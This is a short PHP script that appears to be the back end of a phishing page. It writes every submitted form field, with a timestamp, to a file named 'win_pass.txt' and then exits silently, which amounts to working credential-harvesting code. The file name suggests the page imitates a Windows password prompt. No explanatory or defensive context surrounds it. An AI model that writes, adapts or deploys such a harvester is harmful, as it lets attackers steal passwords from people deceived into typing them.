<?php
$date = new DateTime();
$date = $date->format("y:m:d h:i:s");
$handle = fopen('win_pass.txt', 'a+');
fwrite($handle, $date);
fwrite($handle, "\n ");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
